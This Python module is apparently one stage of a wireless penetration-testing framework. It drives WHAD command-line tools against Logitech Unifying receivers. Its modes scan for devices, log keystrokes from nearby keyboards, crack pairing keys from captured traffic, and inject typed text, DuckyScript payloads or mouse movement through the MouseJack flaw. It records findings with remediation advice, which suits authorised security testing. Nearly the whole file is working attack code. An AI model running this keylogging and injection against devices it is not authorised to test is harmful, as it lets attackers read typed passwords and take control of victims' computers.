"""
Stage 10 — Logitech Unifying / MouseJack

Uses WHAD CLI tools (wuni-scan, wuni-keyboard, wuni-mouse, wanalyze) for all RF
operations. The dongle device is closed before each subprocess and reopened after,
following the same pattern as S5 and S7.

Modes (operator-selectable):
  sniff    — passive scan for Unifying devices; keylog any detected keyboards;
              wanalyze keystroke+pairing_cracking pipeline on capture
  inject   — MouseJack: synchronise and inject keystrokes into a vulnerable receiver
  ducky    — like inject but plays a DuckyScript file (-d PATH) with locale (-l)
  mouse    — mouse injection: move + click; supports duplication mode (-d relay)
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from typing import Optional

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger
import config

log = get_logger("s10_unifying")

SCAN_SECS    = config.UNIFYING_SNIFF_SECS    # passive scan window (seconds)
INJECT_SECS  = config.UNIFYING_INJECT_SECS   # pre-inject scan window (seconds)
KL_SECS      = 15                             # keylogger capture window (seconds)
SYNC_TIMEOUT = 12                             # extra seconds for keyboard sync

# wuni-scan output: [014][29:b9:81:2c:a4] 00c2a4... | Mouse (movement)
_SCAN_LINE = re.compile(r'^\s*\[\d+\]\[([0-9a-f:]+)\]\s+\S+\s+\|\s+(.+)$', re.I)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(
    dongle: WhadDongle,
    engagement_id: str,
    mode: str,
    interface: str | None = None,
) -> None:
    """Run the Unifying stage.

    Args:
        dongle: Active WHAD dongle (device will be closed and reopened).
        engagement_id: Engagement ID for Finding storage.
        mode: "sniff" | "inject" | "ducky" | "mouse"
        interface: WHAD interface string to pass to wuni-* tools.
                   Defaults to config.INTERFACE when None.
    """
    _iface = interface or config.INTERFACE
    missing = [t for t in ("wuni-scan", "wuni-keyboard", "wuni-mouse")
               if shutil.which(t) is None]
    if missing:
        log.warning(
            f"[S10] Missing CLI tools: {missing}. "
            "Install WHAD (pip install whad) to get these tools."
        )
        return

    if mode == "sniff":
        _run_sniff_mode(dongle, engagement_id, _iface)
    elif mode == "inject":
        _run_inject_mode(dongle, engagement_id, _iface)
    elif mode == "ducky":
        _run_ducky_mode(dongle, engagement_id, _iface)
    elif mode == "mouse":
        _run_mouse_mode(dongle, engagement_id, _iface)
    else:
        log.error(f"[S10] Unknown mode '{mode}' — expected sniff/inject/ducky/mouse.")


# ---------------------------------------------------------------------------
# Sniff sub-mode (passive + keylog + wanalyze pipeline)
# ---------------------------------------------------------------------------

def _run_sniff_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> None:
    """Passive scan, keylog detected keyboards, run wanalyze on capture."""
    log.info(f"[S10][sniff] Scanning all Unifying channels for {SCAN_SECS}s ...")

    dongle.device.close()
    time.sleep(0.5)

    try:
        seen = _wuni_scan(SCAN_SECS, interface)

        if not seen:
            log.info("[S10][sniff] No Unifying devices detected in scan window.")
            _print_summary(mode="sniff", discovered=0, injected=False)
            return

        log.info(f"[S10][sniff] {len(seen)} device(s) found.")

        for addr, dtype in seen.items():
            finding = Finding(
                type="unifying_device_discovered",
                severity="medium",
                target_addr=addr,
                description=(
                    f"Logitech Unifying {dtype} detected at ESB address {addr}. "
                    "Unifying devices transmit plaintext mouse events and may accept "
                    "unencrypted keystroke injection (MouseJack)."
                ),
                remediation=(
                    "Replace affected Logitech Unifying receivers with modern encrypted "
                    "Bolt receivers. Unifying receivers cannot be patched against MouseJack "
                    "at the RF layer — hardware replacement is required."
                ),
                evidence={"esb_address": addr, "device_type": dtype,
                          "scan_duration_seconds": SCAN_SECS},
                engagement_id=engagement_id,
            )
            insert_finding(finding)
            log.info(f"FINDING [medium] unifying_device_discovered: {addr} ({dtype})")

        # Keylogger pass against detected keyboard-type devices
        kbd_addrs = [a for a, t in seen.items() if t in ("keyboard", "unknown")]
        pcap_file: str | None = None

        if kbd_addrs:
            # Capture while keylogging so wanalyze can process it afterwards
            pcap_file = _sniff_with_capture(kbd_addrs[0], KL_SECS, interface, engagement_id)
            keystrokes = _wuni_keyboard_log(kbd_addrs[0], KL_SECS, interface)
            if keystrokes:
                finding = Finding(
                    type="unifying_keystrokes_captured",
                    severity="high",
                    target_addr=kbd_addrs[0],
                    description=(
                        f"Plaintext keystrokes captured from Logitech Unifying keyboard "
                        f"({kbd_addrs[0]}): {len(keystrokes)} event(s) decoded over "
                        f"{KL_SECS}s passive capture."
                    ),
                    remediation=(
                        "Replace with Logitech Bolt (AES-128 encrypted) "
                        "or a wired keyboard in sensitive areas."
                    ),
                    evidence={"esb_address": kbd_addrs[0],
                              "keystrokes_captured": len(keystrokes),
                              "sample": keystrokes[:10],
                              "capture_duration_seconds": KL_SECS},
                    engagement_id=engagement_id,
                )
                insert_finding(finding)
                log.info(
                    f"FINDING [high] unifying_keystrokes_captured: "
                    f"{kbd_addrs[0]} ({len(keystrokes)} events)"
                )
            else:
                log.info("[S10][sniff] No keystrokes decoded in capture window.")

        # wanalyze pipeline on the PCAP if we have one
        if pcap_file and os.path.exists(pcap_file):
            _run_wanalyze_pipeline(pcap_file, engagement_id, kbd_addrs[0] if kbd_addrs else "")

    finally:
        _reopen_dongle(dongle, interface)

    _print_summary(mode="sniff", discovered=len(seen), injected=False)


# ---------------------------------------------------------------------------
# Inject sub-mode (MouseJack text)
# ---------------------------------------------------------------------------

def _run_inject_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> None:
    """MouseJack: discover devices via wuni-scan, then inject via wuni-keyboard/-mouse."""
    log.info(f"[S10][inject] Scanning for Unifying devices ({INJECT_SECS}s) ...")

    dongle.device.close()
    time.sleep(0.5)

    seen: dict[str, str] = {}
    inject_ok = False
    method = ""

    try:
        seen = _wuni_scan(INJECT_SECS, interface)
        target_addr = _prompt_target_address(seen)

        if not target_addr:
            log.info("[S10][inject] No target selected — injection aborted.")
            return

        log.info(f"[S10][inject] Target: {target_addr}")

        # Primary: keyboard injection with locale
        text = config.MOUSEJACK_TEXT
        locale = config.UNIFYING_LOCALE
        log.info(
            f"[S10][inject] Keyboard injection → {text!r} (locale={locale})"
        )
        if _wuni_keyboard_inject(target_addr, text, interface, locale=locale):
            inject_ok = True
            method = "keyboard"
            log.info("[S10][inject] Keyboard injection complete.")
        else:
            log.info("[S10][inject] Keyboard injection failed — trying mouse fallback.")
            if _wuni_mouse_inject(target_addr, interface):
                inject_ok = True
                method = "mouse"
                log.info("[S10][inject] Mouse injection complete.")
            else:
                log.warning(
                    "[S10][inject] Both injection methods failed — "
                    "device may not be in range or is immune."
                )

        _record_inject_finding(
            inject_ok, method, target_addr, text, engagement_id
        )

    finally:
        _reopen_dongle(dongle, interface)

    _print_summary(mode="inject", discovered=len(seen), injected=inject_ok, method=method)


# ---------------------------------------------------------------------------
# DuckyScript sub-mode
# ---------------------------------------------------------------------------

def _run_ducky_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> None:
    """Inject a DuckyScript file via wuni-keyboard -d SCRIPT -l LOCALE."""
    script_path = config.UNIFYING_DUCKY_SCRIPT
    locale = config.UNIFYING_LOCALE

    if not script_path:
        # Prompt operator for script path
        try:
            script_path = input(
                "  DuckyScript file path (absolute): "
            ).strip()
        except (KeyboardInterrupt, EOFError):
            script_path = ""

    if not script_path or not os.path.exists(script_path):
        log.warning(
            "[S10][ducky] DuckyScript file not found or not specified. "
            "Set config.UNIFYING_DUCKY_SCRIPT or provide path at prompt."
        )
        return

    log.info(
        f"[S10][ducky] Scanning for Unifying devices ({INJECT_SECS}s) ..."
    )
    dongle.device.close()
    time.sleep(0.5)

    seen: dict[str, str] = {}
    inject_ok = False

    try:
        seen = _wuni_scan(INJECT_SECS, interface)
        target_addr = _prompt_target_address(seen)

        if not target_addr:
            log.info("[S10][ducky] No target selected — aborted.")
            return

        log.info(
            f"[S10][ducky] Injecting {script_path!r} → {target_addr} "
            f"(locale={locale})"
        )
        inject_ok = _wuni_keyboard_ducky(target_addr, script_path, interface, locale)

        if inject_ok:
            log.info("[S10][ducky] DuckyScript injection complete.")
            finding = Finding(
                type="mousejack_ducky_injection",
                severity="critical",
                target_addr=target_addr,
                description=(
                    f"DuckyScript injection succeeded against Logitech Unifying receiver "
                    f"at {target_addr}. Script {os.path.basename(script_path)!r} "
                    f"was played back without authentication (locale={locale})."
                ),
                remediation=(
                    "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                    "No firmware update can patch MouseJack at the RF layer."
                ),
                evidence={
                    "esb_address": target_addr,
                    "injection_method": "ducky",
                    "script_file": os.path.basename(script_path),
                    "locale": locale,
                },
                engagement_id=engagement_id,
            )
            insert_finding(finding)
            log.info(
                f"FINDING [critical] mousejack_ducky_injection: {target_addr}"
            )
        else:
            log.warning(
                "[S10][ducky] DuckyScript injection failed — "
                "device may not be in range or is immune."
            )
    finally:
        _reopen_dongle(dongle, interface)

    _print_summary(mode="ducky", discovered=len(seen), injected=inject_ok, method="ducky")


# ---------------------------------------------------------------------------
# Mouse sub-mode (move + click; optional hardware duplication relay)
# ---------------------------------------------------------------------------

def _run_mouse_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> None:
    """Mouse injection — standard move+click or hardware duplication relay (-d)."""
    log.info(
        f"[S10][mouse] Scanning for Unifying devices ({INJECT_SECS}s) ..."
    )
    dongle.device.close()
    time.sleep(0.5)

    seen: dict[str, str] = {}
    inject_ok = False

    try:
        seen = _wuni_scan(INJECT_SECS, interface)
        target_addr = _prompt_target_address(seen)

        if not target_addr:
            log.info("[S10][mouse] No target selected — aborted.")
            return

        dup_mode = _ask_mouse_dup_mode()
        log.info(
            f"[S10][mouse] Mouse injection → {target_addr} "
            f"({'duplication relay' if dup_mode else 'scripted move+click'})"
        )

        if dup_mode:
            inject_ok = _wuni_mouse_dup(target_addr, interface)
        else:
            inject_ok = _wuni_mouse_inject(target_addr, interface)

        if inject_ok:
            finding = Finding(
                type="mousejack_mouse_injection",
                severity="medium",
                target_addr=target_addr,
                description=(
                    f"MouseJack mouse injection succeeded against Logitech Unifying "
                    f"receiver at {target_addr}. Cursor "
                    + ("relayed from host mouse without authentication."
                       if dup_mode else "movement injected without authentication.")
                ),
                remediation="Replace Unifying receivers with Logitech Bolt.",
                evidence={
                    "esb_address": target_addr,
                    "injection_method": "mouse_dup" if dup_mode else "mouse",
                    "move_delta": "relay" if dup_mode else "50,50",
                },
                engagement_id=engagement_id,
            )
            insert_finding(finding)
            log.info(
                f"FINDING [medium] mousejack_mouse_injection: {target_addr}"
            )
    finally:
        _reopen_dongle(dongle, interface)

    _print_summary(
        mode="mouse", discovered=len(seen), injected=inject_ok,
        method="mouse_dup" if inject_ok else "mouse",
    )


# ---------------------------------------------------------------------------
# CLI subprocess helpers
# ---------------------------------------------------------------------------

def _wuni_scan(
    duration: float,
    interface: str,
    channel: int | None = None,
    address: str | None = None,
) -> dict[str, str]:
    """Run wuni-scan for `duration` seconds; return {addr: device_type} dict.

    Args:
        channel: Restrict to a specific ESB channel (0-100). None = all channels.
        address: Filter to a specific ESB device address. None = all devices.
    """
    seen: dict[str, str] = {}
    deadline = time.time() + duration
    cmd_base = ["wuni-scan", "-i", interface]
    if channel is not None:
        cmd_base += ["-c", str(channel)]
    if address is not None:
        cmd_base += ["-a", address]

    try:
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            proc = subprocess.Popen(
                cmd_base,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            t_start = time.time()
            timer = threading.Timer(remaining, proc.terminate)
            timer.start()
            try:
                assert proc.stdout is not None
                for line in proc.stdout:
                    m = _SCAN_LINE.match(line)
                    if not m:
                        continue
                    addr = m.group(1).lower()
                    desc = m.group(2).lower()
                    dtype = ("keyboard" if "key" in desc
                             else "mouse" if "mouse" in desc
                             else "unknown")
                    if addr not in seen:
                        log.info(f"[S10] Unifying device: {addr} ({dtype})")
                        seen[addr] = dtype
                    elif seen[addr] == "unknown" and dtype != "unknown":
                        seen[addr] = dtype
            finally:
                timer.cancel()
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                elapsed = time.time() - t_start
                if elapsed < 2.0:
                    stderr_out = (proc.stderr.read() if proc.stderr else "").strip()
                    if stderr_out:
                        log.debug(f"[S10] wuni-scan stderr: {stderr_out}")
                    time.sleep(0.5)
    except FileNotFoundError:
        log.warning("[S10] wuni-scan not found")
    except Exception as exc:
        log.debug(f"[S10] wuni-scan error: {exc}")

    log.info(f"[S10] Scan complete — {len(seen)} device(s) found.")
    return seen


def _wuni_keyboard_inject(
    address: str,
    text: str,
    interface: str,
    locale: str = "us",
) -> bool:
    """Inject keystrokes via wuni-keyboard -p TEXT -l LOCALE. Returns True on success."""
    try:
        result = subprocess.run(
            ["wuni-keyboard", "-i", interface, "-a", address,
             "-p", text, "-l", locale],
            timeout=SYNC_TIMEOUT + 5,
            capture_output=True, text=True,
        )
        return result.returncode == 0
    except FileNotFoundError:
        log.warning("[S10] wuni-keyboard not found")
    except subprocess.TimeoutExpired:
        log.warning("[S10] wuni-keyboard inject timed out")
    except Exception as exc:
        log.debug(f"[S10] wuni-keyboard inject error: {exc}")
    return False


def _wuni_keyboard_ducky(
    address: str,
    script_path: str,
    interface: str,
    locale: str = "us",
) -> bool:
    """Play a DuckyScript file via wuni-keyboard -d SCRIPT -l LOCALE."""
    try:
        result = subprocess.run(
            ["wuni-keyboard", "-i", interface, "-a", address,
             "-d", script_path, "-l", locale],
            timeout=120,  # DuckyScript may be long-running
            capture_output=True, text=True,
        )
        return result.returncode == 0
    except FileNotFoundError:
        log.warning("[S10] wuni-keyboard not found")
    except subprocess.TimeoutExpired:
        log.warning("[S10] wuni-keyboard DuckyScript timed out (120s)")
    except Exception as exc:
        log.debug(f"[S10] wuni-keyboard ducky error: {exc}")
    return False


def _wuni_mouse_inject(address: str, interface: str) -> bool:
    """Inject mouse movement via wuni-mouse stdin (X,Y,WX,WY,BUTTONS)."""
    try:
        result = subprocess.run(
            ["wuni-mouse", "-i", interface, "-a", address],
            input="50,50,0,0,\n",
            timeout=SYNC_TIMEOUT + 5,
            capture_output=True, text=True,
        )
        return result.returncode == 0
    except FileNotFoundError:
        log.warning("[S10] wuni-mouse not found")
    except subprocess.TimeoutExpired:
        log.warning("[S10] wuni-mouse inject timed out")
    except Exception as exc:
        log.debug(f"[S10] wuni-mouse inject error: {exc}")
    return False


def _wuni_mouse_dup(address: str, interface: str) -> bool:
    """Relay host mouse input via wuni-mouse -d (duplication mode).

    Runs for SYNC_TIMEOUT seconds — the operator moves the physical mouse
    during this window and movements are forwarded to the target receiver.
    """
    try:
        proc = subprocess.Popen(
            ["wuni-mouse", "-i", interface, "-a", address, "-d"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        log.info(
            f"[S10] Mouse duplication active for {SYNC_TIMEOUT}s — "
            "move your mouse to relay cursor events."
        )
        timer = threading.Timer(SYNC_TIMEOUT, proc.terminate)
        timer.start()
        try:
            proc.wait(timeout=SYNC_TIMEOUT + 3)
        except subprocess.TimeoutExpired:
            proc.kill()
        finally:
            timer.cancel()
        return proc.returncode == 0 or proc.returncode == -15  # SIGTERM is normal exit
    except FileNotFoundError:
        log.warning("[S10] wuni-mouse not found")
    except Exception as exc:
        log.debug(f"[S10] wuni-mouse dup error: {exc}")
    return False


def _wuni_keyboard_log(address: str, duration: float, interface: str) -> list[str]:
    """Run wuni-keyboard in keylogger mode (no -p) for `duration` seconds."""
    lines: list[str] = []
    try:
        proc = subprocess.Popen(
            ["wuni-keyboard", "-i", interface, "-a", address],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        timer = threading.Timer(duration, proc.terminate)
        timer.start()
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                stripped = line.strip()
                if stripped:
                    lines.append(stripped)
                    log.debug(f"[S10] Keystroke: {stripped}")
        finally:
            timer.cancel()
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
    except FileNotFoundError:
        log.warning("[S10] wuni-keyboard not found")
    except Exception as exc:
        log.debug(f"[S10] wuni-keyboard log error: {exc}")
    return lines


def _sniff_with_capture(
    address: str,
    duration: float,
    interface: str,
    engagement_id: str,
) -> str | None:
    """Capture Unifying traffic to a PCAP file for wanalyze post-processing.

    Uses: wsniff -i IFACE unifying -m ADDR -o PCAP
    Returns the PCAP path, or None on failure.
    """
    if shutil.which("wsniff") is None:
        log.debug("[S10] wsniff not found — skipping PCAP capture for wanalyze")
        return None
    pcap_dir = config.PCAP_DIR
    pcap_dir.mkdir(parents=True, exist_ok=True)
    pcap_path = str(pcap_dir / f"s10_unifying_{engagement_id}_{address.replace(':', '')}.pcap")
    try:
        proc = subprocess.Popen(
            ["wsniff", "-i", interface, "unifying", "-m", address, "-o", pcap_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        timer = threading.Timer(duration, proc.terminate)
        timer.start()
        try:
            proc.wait(timeout=duration + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
        finally:
            timer.cancel()
        if os.path.exists(pcap_path) and os.path.getsize(pcap_path) > 0:
            log.info(f"[S10] PCAP captured: {pcap_path}")
            return pcap_path
    except Exception as exc:
        log.debug(f"[S10] wsniff capture error: {exc}")
    return None


def _run_wanalyze_pipeline(
    pcap_path: str,
    engagement_id: str,
    addr: str,
) -> None:
    """Run wanalyze keystroke + pairing_cracking on a captured Unifying PCAP.

    Uses --json flag for structured output when available; falls back to
    string matching on plain output for older wanalyze versions.
    """
    if shutil.which("wanalyze") is None:
        log.debug("[S10] wanalyze not found — skipping analysis pipeline")
        return

    # Fields that indicate recovered key material in wanalyze JSON output.
    # pairing_cracking: stk (short-term key), ltk, pin, key
    # keystroke: text, keys
    _KEY_JSON_FIELDS = {"stk", "ltk", "irk", "csrk", "key", "pin", "pairing_key"}

    log.info(f"[S10] Running wanalyze pipeline on {pcap_path} ...")
    for module in ("keystroke", "pairing_cracking"):
        try:
            result = subprocess.run(
                ["wanalyze", "--json", pcap_path, module],
                capture_output=True, text=True, timeout=60,
            )
            raw = (result.stdout + result.stderr).strip()

            # Try structured JSON parsing first (wanalyze --json flag).
            key_found = False
            evidence_data: dict = {"wanalyze_module": module, "pcap_path": pcap_path}
            try:
                import json as _json
                data = _json.loads(raw)
                evidence_data["json_output"] = data
                log.info(f"[S10] wanalyze {module} (JSON): {str(data)[:400]}")
                # Walk the parsed structure looking for non-empty key fields.
                flat = _flatten_dict(data)
                for field in _KEY_JSON_FIELDS:
                    val = flat.get(field)
                    if val and str(val).strip() not in ("", "null", "None"):
                        key_found = True
                        evidence_data[f"recovered_{field}"] = str(val)
                        log.info(f"[S10] wanalyze recovered {field}={val!r}")
            except (ValueError, KeyError):
                # Fall back to substring matching on plain text output.
                evidence_data["output_excerpt"] = raw[:400]
                if raw:
                    log.info(f"[S10] wanalyze {module}: {raw[:400]}")
                key_found = (
                    "key" in raw.lower()
                    or "pairing" in raw.lower()
                    or "stk" in raw.lower()
                )

            if key_found:
                finding = Finding(
                    type="unifying_pairing_key_recovered",
                    severity="critical",
                    target_addr=addr,
                    description=(
                        f"wanalyze {module} recovered pairing key material from "
                        f"Unifying traffic capture at {addr}."
                    ),
                    remediation=(
                        "Re-pair all Unifying devices in a physically secure environment. "
                        "Migrate to Logitech Bolt (AES-128 encrypted pairing)."
                    ),
                    evidence=evidence_data,
                    engagement_id=engagement_id,
                )
                insert_finding(finding)
                log.info(
                    f"FINDING [critical] unifying_pairing_key_recovered: {addr}"
                )
        except subprocess.TimeoutExpired:
            log.debug(f"[S10] wanalyze {module} timed out")
        except Exception as exc:
            log.debug(f"[S10] wanalyze {module} error: {exc}")


def _flatten_dict(obj: object, prefix: str = "") -> dict:
    """Recursively flatten a nested dict/list into {dotted.key: value} pairs."""
    result: dict = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            full = f"{prefix}.{k}" if prefix else k
            result.update(_flatten_dict(v, full))
            # Also store by leaf key alone for easy lookup
            result.setdefault(k, v)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            result.update(_flatten_dict(v, f"{prefix}[{i}]"))
    else:
        result[prefix] = obj
    return result


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _prompt_target_address(seen: dict[str, str]) -> Optional[str]:
    """Show discovered devices and prompt operator to select injection target."""
    print()
    if seen:
        print("  Discovered Unifying devices:")
        addr_list = list(seen.items())
        for i, (addr, dtype) in enumerate(addr_list, 1):
            print(f"    [{i}]  {addr}  ({dtype})")
        print()
        print("  Enter number to select, or type ESB address manually.")
        print("  Leave empty to abort.")
    else:
        print("  No Unifying devices found in scan window.")
        print(
            "  Enter ESB address manually (e.g. 29:b9:81:2c:a4) "
            "or leave empty to abort."
        )
    print()

    try:
        raw = input("  Target [number/address/enter to abort]: ").strip()
    except (KeyboardInterrupt, EOFError):
        return None

    if not raw:
        return None

    if raw.isdigit() and seen:
        idx = int(raw) - 1
        addr_list = list(seen.items())
        if 0 <= idx < len(addr_list):
            return addr_list[idx][0]
        print("  Invalid selection.")
        return None

    return raw.lower()


def _ask_mouse_dup_mode() -> bool:
    """Ask operator whether to use mouse duplication (-d) or scripted inject."""
    print()
    print("  Mouse mode:")
    print("    [S]  Scripted  — inject fixed move (50,50) + no buttons")
    print("    [D]  Dup relay — relay physical host mouse to target (wuni-mouse -d)")
    while True:
        try:
            c = input("  Select [S/D]: ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            return False
        if c in ("S", ""):
            return False
        if c == "D":
            return True
        print("  Please enter S or D.")


def _record_inject_finding(
    inject_ok: bool,
    method: str,
    target_addr: str,
    text: str,
    engagement_id: str,
) -> None:
    if not inject_ok:
        return
    if method == "keyboard":
        finding = Finding(
            type="mousejack_keystroke_injection",
            severity="critical",
            target_addr=target_addr,
            description=(
                f"MouseJack keystroke injection succeeded against Logitech Unifying "
                f"receiver at {target_addr}. Arbitrary text "
                f"({text!r}) was injected without authentication."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "No firmware update can patch MouseJack at the RF layer."
            ),
            evidence={"esb_address": target_addr, "injection_method": "keyboard",
                      "text_injected": text},
            engagement_id=engagement_id,
        )
    else:
        finding = Finding(
            type="mousejack_mouse_injection",
            severity="medium",
            target_addr=target_addr,
            description=(
                f"MouseJack mouse injection succeeded against Logitech Unifying "
                f"receiver at {target_addr}. Cursor movement injected without auth."
            ),
            remediation="Replace Unifying receivers with Logitech Bolt.",
            evidence={"esb_address": target_addr, "injection_method": "mouse",
                      "move_delta": "50,50"},
            engagement_id=engagement_id,
        )
    insert_finding(finding)
    log.info(
        f"FINDING [{finding.severity}] {finding.type}: {target_addr} via {method}"
    )


def _reopen_dongle(dongle: WhadDongle, interface: str) -> None:
    """Re-create the underlying WhadDevice, polling every 0.5s up to 15s."""
    deadline = time.time() + 15.0
    last_exc: Exception | None = None
    while time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(interface)
            return
        except Exception as exc:
            last_exc = exc
            time.sleep(0.5)
    log.warning(
        f"[S10] Could not reopen WHAD device after 15s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


def _print_summary(
    mode: str,
    discovered: int,
    injected: bool,
    method: str = "",
) -> None:
    mode_labels = {
        "sniff": "Sniff / Keylog",
        "inject": "MouseJack Inject",
        "ducky":  "DuckyScript Inject",
        "mouse":  "Mouse Inject",
    }
    mode_label = mode_labels.get(mode, mode)
    result = "SUCCESS" if injected else ("N/A" if mode == "sniff" else "FAILED/IMMUNE")
    print("\n" + "─" * 76)
    print(f"  STAGE 10 SUMMARY -- Logitech Unifying / {mode_label}")
    print("─" * 76)
    print(f"  {'Mode':<22}: {mode_label}")
    print(f"  {'Devices discovered':<22}: {discovered}")
    if mode != "sniff":
        print(f"  {'Injection result':<22}: {result}")
        if method:
            print(f"  {'Method':<22}: {method}")
    print("─" * 76 + "\n")
